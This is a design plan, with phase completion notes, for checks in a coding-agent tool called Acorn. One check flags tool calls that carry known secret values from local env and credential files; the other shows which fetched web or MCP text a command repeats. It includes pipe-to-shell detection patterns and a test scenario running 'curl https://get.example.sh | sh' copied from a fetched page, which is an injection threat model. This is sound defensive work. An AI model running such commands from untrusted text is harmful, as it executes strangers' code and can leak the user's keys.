# Known key values and command origins in agent sessions

## Phase 3 completion note

November 6, 2026. Phase 3, blocking, landed. All three phases are done.

What landed:

- `KnownValueIndex.matcher(folder)` in `knownValues.ts`. It reads a folder's sources once and returns
  `{ version, lookup(text) }`. `lookup(text, folder)` is now a call through it. The version is a
  SHA-256 over each source's label, salted hashes, and names, so it changes when a key is added,
  removed, or renamed, and at each Node start.
- `matcher(folder)` on the `knownValues` core facet, beside `carried`. It writes no audit row.
  `KnownValueMatcher` is a type export of `core/index.ts` and `@acorn/plugin-api/node`.
- The bridge check in `answerLoopHook`. It runs on `PreToolUse` before any plugin handler, through a
  `blockedKeys(text, folder)` port that returns nothing while blocking is off. It looks up the tool's
  whole input, which `claudeToolSubject` now carries as `input`, with an `mcp` flag beside it. A
  match on a `command` or `fetch` kind, or on an MCP tool, is a deny with the agreed text. An edit, a
  read, and any other tool get no decision.
- The install condition in `ManagedAgentEngine`: the before-tool bridge installs when a point has a
  handler, or when blocking is on and the facet exists.
- The Git `known-value` rule in `secretCheck.ts`, for commit and push blobs and for pushed tag
  messages. The blob cache key and both Git digests include the matcher's version.
- `name?` on `SecretFinding`, and `describeSecretRefusal` prints it: "known-value (DB_PASSWORD) at
  config.ts:3". The one-time allowance needs no change.
- Docs: `docs/security/known-key-values.md` (new), pointers and the Git rule in
  `secret-publication.md`, the install condition in `loop-hooks.md`, the audit line in
  `docs/security/audit.md`, and an entry in `docs/README.md`.

Decisions and deviations:

- The index isn't exported through `@acorn/plugin-api/node`. The Git check and the bridge reach it
  through the facet, so node-core needs no new entry point.
- The version goes into the Git report's `digest`, which the gate's decision ID already hashes,
  rather than into the gate itself. Only Git publishes with known keys, and the gate stays generic.
  The digest of an incomplete check leaves the version out, because no keys were checked.
- Git looks up each line, not each blob, so a finding has a line number and a lockfile over 2 MiB
  isn't cut short. The column is always 1. A single line over 2 MiB is unscanned, which makes the
  check incomplete and blocks with the switch on. A minified bundle on one line hits this.
- A lookup with no keys at all now reports `truncated: false`, since nothing went unchecked.
- The bridge names every match in one refusal, separated by commas, so the model fixes them in one
  attempt.
- A bridge refusal writes no audit row of its own. The event store's `secrets.agent.carried` row
  covers the call when the harness reports it. I didn't confirm that Claude's ACP adapter reports a
  call its hook denied.
- `secret-publication.md` would have run to 219 lines against the 200-line cap, so the index, the
  tool card warning, the bridge refusal, and the Settings list moved to `known-key-values.md`. Two
  code comments cite it instead of this plan.
- A Phase 2 comment in `knownValues.ts` named Stroq's `secrets/extract.ts`. The comment path check
  fails on it in a checkout without `references/Stroq`, so it names the two patterns instead.

Left over:

- The Node service size check is 1,946,645 bytes against its 1,944,000 ceiling. This phase adds 320
  bytes, in the engine's install condition, the runtime's port, and the core facet. I didn't raise
  the ceiling.
- Five site pages cite the changed docs and weren't updated:
  `security/credentials-and-secrets.md`, `security/the-audit-log.md`,
  `security/what-acorn-doesnt-protect-against.md`, `settings/machines.md`, and
  `build-plugins/node/act-on-agent-turns-with-hooks.mdx`. `pnpm --filter @acorn/site stale` lists them.
- I didn't walk the acceptance scenarios in `pnpm dev:agent`: the Claude Code and Codex sessions, the
  commit allowed once from Settings, and the grep of `agent_events`, the audit table, and the Node log.
  Unit tests cover each path with values built at runtime.
- The Changes pane lists a `known-value` finding by rule and line, without the key name. The refusal
  message names it.
- Turning blocking on reaches a running Claude Code session after its next resume, like a new handler.

## Phase 2 completion note

November 6, 2026. Phase 2, the index and the after-the-fact warning, landed. Phase 3 isn't started.

What landed:

- `packages/node-core/src/server/secretChecks/knownValues.ts`. `createKnownValueIndex({ home, env })`
  builds an index with a salt drawn per Node start. `knownValueIndex()` is the Node's one shared
  index. `lookup(text, folder)` returns `{ matches, truncated }`. `sources()` returns each source
  with its key names, for Settings. The index reads the task folder's env files, the four home
  folder files, and the environment. It rereads a file when its size or modification time changes.
- `auditCarriedKeys(db, index, input)` in the same file. It runs the lookup and, on a match, writes
  `secrets.agent.carried` with the session as the subject and `toolCallId` and `names` as details.
- `CompiledCoreServices.knownValues.carried(...)`, an optional facet beside `secretPublication`. It
  loads the module on first use.
- `secretValues?: KnownValueMatch[]` on `AgentToolCall`, kept by `mergeToolCall`. The protocol
  types `KnownValueMatch` and `KnownKeySource` live in `packages/protocol/src/secretChecks.ts`.
- The lookup runs in `ProviderEventMaterializer.map`, before an input over 64 KiB moves to an
  artifact, through a `carriedKeys` port that `ManagedAgentEngine.carriedKeys` fills. The engine
  passes the session's task root as the folder. A failure logs a warning and finds no keys.
- The warning line in `AgentToolCallCard`, outside the `agents:tool-card` slot so a contributed
  renderer can't drop it: "This tool call contained `STRIPE_SECRET_KEY` from .env.local." The
  terminal client draws it too. Its fixture shows it only behind `ACORN_FIXTURE_CARRIED_KEYS`.
- **Keys Acorn knows about** in Settings > Security and backup > Secret checks. Each source shows a
  count, and a closed fold shows its names. The list rides on the secret publication route as
  `knownKeys`, so it needs no route of its own.

Decisions and deviations:

- `knownValues.ts` isn't exported through `@acorn/plugin-api/node`. The facade check fails on an
  export with no importer, and the export also needs a `./server/secretChecks/knownValues.ts` entry in
  `packages/node-core/package.json`, which would take node-core past its cap of 70 entry points
  (`boundaries.test.ts`). The agents plugin reaches the index through the `knownValues` facet
  instead. Phase 3 adds the export when the bridge check or the Git rule imports it, and needs to
  make room under the cap first.

- The environment source is the Node's own `process.env`, labeled "Acorn's environment". Each
  harness gets its environment from `brokerEnv` over that same parent, and the event store doesn't
  hold a session's own environment when it saves a call. This indexes more than any one harness
  sees, such as the Node's internal tokens. That only adds warnings, and every one is a real value.
- Only the top level of a task folder is read, as the plan says. A `.env` in `apps/api/` of a
  monorepo isn't indexed.
- One lookup and one audit row per call. The materializer checks the first event that carries a
  call's input, as `RepeatedToolCalls` counts it, and remembers the last 1,000 calls it checked.
  Codex repeats the input on completion, and that repeat isn't looked up again.
- The index has no version string. Phase 3 is its only reader, and what it should cover (one task
  folder or all of them) depends on how the Git cache key uses it.
- The value rules follow Stroq's `extract.ts`, trimmed. A quoted dotenv value ends at its first
  matching quote, with no escape handling. Docker `auth` is indexed both as the base64 string and as
  its decoded password.
- The index forgets a task folder after 50 others have been looked up more recently. Settings shows
  a folder only after an agent in that task has made a tool call since the Node started.

For Phase 3:

- The Node service size check is 1,946,325 bytes against a 1,944,000 ceiling. This phase adds 844
  bytes to the static graph, all in the event store and the core facet. The index loads lazily. I
  didn't raise the ceiling.
- The bridge check and the Git rule can call `knownValueIndex().lookup(text, folder)` and use
  `truncated`. Import it lazily: no boot-path module imports `knownValues.ts` today.
- I fixed a citation from Phase 1 in `commandOrigin.ts`: it cited "§ Where a command came from",
  but the heading is "Part 2: where a command came from", and `docCitations.test.ts` failed on it.
- `docs/security/secret-publication.md` doesn't mention the agent check, the audit verb, the home
  folder reads, or the Settings list. That doc update is Phase 3's.

## Phase 1 completion note

November 6, 2026. Phase 1, the origin line, landed. Phases 2 and 3 aren't started.

What landed:

- `plugins/agents/src/server/sessions/commandOrigin.ts`: `commandOrigin(command, ownToolCallId, recent)`
  is pure. It extracts URLs, hosts, pipe-to-shell lines, and package names after `npx`, `uvx`,
  `pnpm dlx`, `npm install`, `pip install`, `go install`, and `cargo install`. A source is a tool call
  with `web` set or an MCP `name`, read from its `output` and its `web.results`. A full URL, a pipe
  line, or a package wins over a host alone, across all sources, newest first.
- `AgentStore.recentToolCalls(sessionId, limit)`, backed by `readRecentToolCalls` in
  `toolCallRead.ts`. It reads the session's latest 200 calls by start order through the
  `agent_events_session_tool_idx` expressions and folds each with `mergeToolCall`.
- `AgentRequestOrigin` and the optional `origin` field on the `request` event in `wire.ts`. The store
  also writes it into the request row's `payloadJson`, beside `approval`, because the waiting card
  reads the row and not the event.
- The two call sites. `settlePermissionRequest` and `holdAsk` each get a `recentToolCalls` port. Both
  fail open: a read that throws logs a warning and the card has no line.
- The card line in `AgentRequestCard` (waiting) and in `AgentEventCard` (the record left in the thread,
  including a refused request). The terminal client draws the same components.
- A section in `docs/managed-agents/permission-policy.md`.

Decisions and deviations:

- The extraction is my own small set of patterns. Stroq's word parser, encoded atoms, and wrapped-line
  handling are left out, as the plan says.
- The line reads "`<match>` appears in the result of "`<tool title>`", N calls earlier." The plan's
  example says "in a web fetch of …", but only the title is stored, so the line quotes the title.
- `callsAgo` counts every earlier tool call, not only sources, and skips the call being asked about.
- Only the result side of a source counts, not its input. The URL an agent chose to fetch is the
  agent's own text.
- The caps (200 for `match`, 500 for `toolTitle`) live in `commandOrigin`. `boundProviderEvent` doesn't
  repeat them, because only acorn's own code sets `origin`.
- The terminal fixture shows the line only behind `ACORN_FIXTURE_REQUEST_ORIGIN`. Without the flag,
  the extra row pushed the response's Copy menu off a 40-row screen in another test.

For later phases:

- The Node service size check is already over its ceiling on the base commit: 1,945,205 bytes against
  1,944,000. This phase adds 276 bytes, for 1,945,481. I didn't raise the ceiling.
- Phase 2's tool card warning can reuse the `requestOrigin.ts` pattern on the client: a reader for a
  stored payload and one function for the sentence.
- "Later, once the line has been used" in Part 2 can call `commandOrigin` directly. It needs only the
  command, the call's ID, and `recentToolCalls`.

Date: November 6, 2026. Status: phases 1 to 3 built November 6, 2026. The live acceptance checks in
`pnpm dev:agent` remain open. The shipped contract is in
[known key values](../security/known-key-values.md) and [permission
policy](../managed-agents/permission-policy.md#where-a-command-came-from).

This page covers two checks on what an agent runs. The first notices when a tool call carries the
value of a key on this machine. The second tells the person, on a permission card, which text the
agent read that a command repeats. Both ideas come from Stroq, a local guard for coding agents, cloned
at `references/Stroq`, a folder Git ignores. Acorn already has the hooks, the transcript store, and
the card those checks need, so this plan borrows the ideas and a little code, not the tool.

[Secret checks before publication](../security/secret-publication.md),
[harness bridges](../managed-agents/loop-hooks.md), and [permission
policy](../managed-agents/permission-policy.md) own the rules that exist. Those pages win where this
plan disagrees with them.

## Starting point

Checked against `main` at `94689daef` on November 6, 2026.

- The detector in `packages/node-core/src/server/secretChecks/detector.ts` finds secrets by shape:
  documented provider prefixes, private key headers, JWTs, URL passwords, and high-randomness
  assignments. It runs only at four operations Acorn owns: a commit, a push, a transcript export, and
  a message with attachments. The secret publication page lists "Git, curl, or uploads run in a
  terminal or by an agent's own tools" as outside coverage.
- A database password, a webhook signing secret, or an internal API key has no documented prefix, so
  the detector can't see it anywhere.
- The event store already matches by value in one place. `ProviderEventMaterializer` takes the tokens
  Acorn issued itself (`mintedSecrets` in `plugins/agents/src/server/sessions/runtimeEngine.ts`) and
  scrubs them out of provider error and diagnostic messages.
- `agents:before-tool` and `agents:after-tool` run on every Claude Code tool call through the bridge,
  but the bridge is installed only when some plugin handles a point. Codex, DeepSeek, and contributed
  ACP harnesses reach `agents:before-permission` only.
- A permission card in `plugins/agents/src/client/sessions/AgentEventCard.tsx` shows the harness's
  title and, for a refused request, "Blocked by `<who>`: `<why>`". Nothing on the card says why the
  agent wants to run the command.
- Tool calls, their input, and their output are stored per session in `agent_events`, with an index
  on session and tool ID. Large output moves to an artifact.

## Goals

- Tell the person when an agent's tool call carried the value of a key from this machine, on every
  harness, after the fact.
- Optionally refuse such a call on Claude Code before it runs, under the switch that already blocks
  publication.
- Catch a known value in a commit or a push, where the shape rules miss it.
- Show, on a permission card, the web page or MCP result a command repeats a URL, host, install
  target, or pipe-to-shell line from.
- Hold no key value anywhere: not in memory past the read, not in SQLite, not in a log, an audit row,
  or a wire event.

## Not in scope

- Stroq's 622 injection rules, its session taint, and its shell command classifier. Stroq measured its
  rules flagging 16% of harmless documentation files, and the classifier is thousands of lines of
  shell parsing.
- Blocking based on origin. The origin line is display only in this plan.
- Removing key values from stored transcripts. See the open decisions.
- A key passed by reference: `$STRIPE_KEY`, `curl -d @.env`, or a script that reads `.env`. The value
  isn't in the command text, so neither check can see it.

## Part 1: known key values

### The index

Add `packages/node-core/src/server/secretChecks/knownValues.ts` (new) beside the detector, and export it
through `@acorn/plugin-api/node` the way the detector is.

It reads these sources:

- The task worktree's `.env`, `.env.*`, `*.env`, and `.envrc` files, skipping names that contain
  `example`, `sample`, `template`, or `dist`.
- `~/.aws/credentials`, `~/.npmrc`, `~/.netrc`, and `~/.docker/config.json`.
- Variables in the environment a harness is started with, whose names look like a secret.

It keeps a value only when all of these hold:

- The key name looks like a secret: `key`, `token`, `secret`, `password`, `credential`, `auth`, and
  the like. Stroq's `SECRET_NAME` and `EXCLUDED_NAME` in `references/Stroq/packages/core/src/secrets/extract.ts` are
  the reference.
- The value is at least 12 characters and has no whitespace.
- The value isn't a placeholder, a path, a host name, or a URL with no password. Reuse the detector's
  `PLACEHOLDER` pattern.
- The value has at least 3.5 bits of entropy per character, using the detector's `entropy` function.

Each kept value becomes `{ hash, name, source }`, where `hash` is SHA-256 over a random salt and the
value. The salt lives in memory and changes at each Node start. The index lives in memory too. Stroq
writes its index to disk because every hook is a new process. Acorn's Node keeps running, so it
doesn't need to. The index records each source's path, size, and modification time, and rereads a
source when either changes. It has a version string that changes whenever its entries change.

A lookup takes text and returns `{ name, source }` for each match. It cuts the text into candidates on
shell, JSON, and URL punctuation, splits again on `/` and `@`, URL-decodes a candidate when that
changes it, hashes each candidate, and checks the map. It reads at most 2 MiB, in overlapping windows,
and says so when the text is longer. Stroq's `references/Stroq/packages/core/src/secrets/candidates.ts` has the window
and padding cases worth copying.

### Where it runs

1. **Every harness, after the fact.** When the event store saves a tool call, it looks up the call's
   `input`. A match adds `secretValues: [{ name, source }]` to the stored tool call and writes a
   `secrets.agent.carried` audit row with the session, the tool call, and the names. This stops
   nothing. Only the input is read here, because output can run to megabytes.
2. **Claude Code, before the call.** With **Block publication with secret findings** on, the before
   tool bridge in `plugins/agents/src/server/sessions/loopHooks.ts` looks up a call's command and
   input before any plugin handler runs. A match on a command, a fetch, or an MCP call is a deny. A
   match on an edit is only reported, because an agent editing `.env` writes the value on purpose.
3. **Commit and push.** The Git secret check in `plugins/git/src/server/changes/secretCheck.ts` runs the
   lookup over each blob it already reads and reports a match as a high-confidence `known-value`
   finding.

The bridge check is compiled into the agents plugin rather than written as a plugin handler, the same
way the publication gate is a compiled-core facet. The lifecycle installs the bridge when a point has
a handler or when blocking is on.

### What the person sees

- **Settings > Security and backup** gets a **Keys Acorn knows about** list under the blocking switch:
  each source with its count, such as "`.env.local` in this task: 4 keys" and "`~/.aws/credentials`:
  2 keys". It shows names on request and never values.
- A tool card whose input carried a known value gets a warning line: "This command contained
  `STRIPE_SECRET_KEY` from `.env.local`." It draws in the web client and the terminal client.
- A refused Claude Code call shows the same "Blocked by Acorn" alert that plugin vetoes use. The model
  reads "Blocked by Acorn: this command contains the value of `STRIPE_SECRET_KEY` from `.env.local`.
  Refer to the variable instead of its value." in the same turn.
- A refused commit or push names `known-value` and the key name in the message the gate already
  writes, and the existing one-time allowance in Settings works on it.

### What changes elsewhere

- The Git blob cache is keyed by `SECRET_DETECTOR_VERSION` and the blob ID. Add the index version to
  that key and to the publication decision digest. Otherwise a key added to `.env` is never checked
  against blobs already in the cache, and an old allowance still applies.
- `docs/security/secret-publication.md` gains a section for the agent checks, and its coverage list
  changes. It must say that the Node reads the home folder files above.
- `docs/managed-agents/loop-hooks.md` says that the bridge also installs when blocking is on.

## Part 2: where a command came from

### The match

Add `plugins/agents/src/server/sessions/commandOrigin.ts` (new), a pure module with one main function:
given a command and a list of recent tool results, return the first result the command repeats
something from, and what it repeats.

It extracts these from both sides:

- URLs, and the host of each URL.
- Pipe-to-shell lines: `curl … | sh`, `wget … | bash`, and their spacing variants.
- Package names in install and run commands: `npx`, `pnpm dlx`, `npm install`, `pip install`,
  `uvx`, `go install`, and `cargo install`.

Stroq's `references/Stroq/packages/core/src/provenance/atoms.ts` and `package-lines.ts` are the reference. Leave out
its base64 and hex decoding and its shell word parser for this version.

Only text from outside the person's control counts as a source:

- Web fetches and searches, which the drivers mark with the tool call's `web` field.
- MCP tool results, which carry an MCP tool `name`. This includes Acorn's own issue and pull request
  tools, because an issue body is a stranger's text.

Files in the repository and command output don't count in this version. Counting them would match
`package.json` every time the agent runs a test, and a line that's always there stops being read.

### Where it runs

The function runs when a permission card is about to be saved:

- `settlePermissionRequest` in `plugins/agents/src/server/sessions/permissionPolicy.ts`, for a
  harness's own request on every harness.
- `holdAsk` in `plugins/agents/src/server/sessions/loopHooks.ts`, for a plugin's ask.

Each reads the session's last 200 tool calls from `agent_events`, keeps the ones that qualify as a
source, and runs the match. A card waits on a person, so a query here costs nothing they notice. No
new table or in-memory state is needed, and a Node restart loses nothing.

The request event in `plugins/agents/src/contract/wire.ts` gains an optional field:

```ts
origin?: { toolCallId: string; toolTitle: string; match: string; callsAgo: number }
```

`match` is capped at 200 characters and `toolTitle` at 500. A client that doesn't know the field
ignores it, as older clients ignore `blocked`.

### What the person sees

A permission card gets one muted line under its title:

> `https://get.example.sh` appears in a web fetch of `github.com/acme/api/issues/12`, 3 calls earlier.

It blocks nothing, and nothing else in the session changes. A wrong match costs a line of text.
Jumping from the line to that tool card needs a link between transcript cards, which doesn't exist,
and is left for later.

### Later, once the line has been used

- Add `origin` to the `agents:before-tool` and `agents:before-permission` payloads, so a policy
  plugin can ask about a command that repeats a stranger's text. That's Stroq's
  `ask-origin-untrusted` rule.
- Run the match on every command at save time and show the line on the tool card too. People in
  bypass mode never see a permission card, so they gain the most from this.

## Open decisions

1. **Reading home folder files by default.** The recommendation is yes for the after-the-fact warning,
   which never leaves the Node, with blocking still behind the switch. The other choice is a separate
   switch, off by default, for the home folder sources.
2. **Blanking known values out of stored transcripts.** That would keep a key out of exports, search,
   and the phone, but every tool output would need a lookup, and some outputs are megabytes. The
   recommendation is to measure the cost on a real session database before deciding.

## Risks

- **Bridge cost.** With blocking on, every Claude Code tool call goes through the bridge. Acorn
  measured a median of 57 ms per call on October 7, 2026, on an Apple silicon Mac.
- **False positives.** A long, random, non-secret value under a secret-looking name, such as a
  build ID, matches. The tool card warning makes these visible before blocking does.
- **What it can't see.** A key passed by reference or read by a script leaves no value in the
  command. The docs must say this beside the feature, not only here.
- **Noise in the origin line.** A popular host like `github.com` would match often. Match full URLs
  and package names first, and a host alone only when no full URL matched.

## Phases

1. **The origin line.** `commandOrigin.ts` with tests, the wire field, the two call sites, and the
   card line. Display only, so a mistake can't break a session. About two days.
2. **The index and the after-the-fact warning.** `knownValues.ts` with tests, the event store lookup,
   the tool card line, the audit row, and the Settings list. About a day and a half.
3. **Blocking.** The bridge check, the install condition, the Git rule, the cache key and digest
   changes, and the docs. About a day and a half.

## Acceptance

- A unit fixture for each source file format, each filter, and the 2 MiB window edge. Build key
  values at runtime, as `detector.test.ts` does, so no key literal sits in the repository.
- A Claude Code session in `pnpm dev:agent` that runs `curl` with a value from a test `.env.local`:
  with blocking off, the tool card warns. With blocking on, the call is refused and the model reads
  the reason.
- A Codex session that runs the same command shows the tool card warning.
- A commit that adds a known value with no provider prefix is refused with blocking on, and allowed
  once from Settings.
- No row in `agent_events`, the audit table, or the Node log holds a key value. A test greps all three
  after the scenarios above.
- A session that fetches a page naming `https://get.example.sh` and then asks to run
  `curl https://get.example.sh | sh` shows the origin line on the card, in the web client and the
  terminal client.
- A session that reads `package.json` and then asks to run `pnpm test` shows no origin line.
